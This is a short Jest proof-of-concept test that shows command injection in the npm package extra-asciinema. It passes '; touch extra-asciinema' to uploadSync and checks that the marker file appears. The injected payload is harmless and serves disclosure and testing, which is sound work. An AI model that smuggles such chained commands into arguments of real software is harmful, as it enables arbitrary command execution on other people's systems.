test("Command Injection in extra-asciinema", (done) => {
  expect.assertions(2);
  const asciinema = require("extra-asciinema");
  const fs = require("fs");
  const path = "./extra-asciinema";
  try {
    if (fs.existsSync(path)) {
      fs.unlinkSync(path);
    }
  } catch (err) {
    console.error(err);
  }
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);
  asciinema.uploadSync("; touch extra-asciinema");
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);
  fs.unlink(path, function (err) {
    done();
  });
});
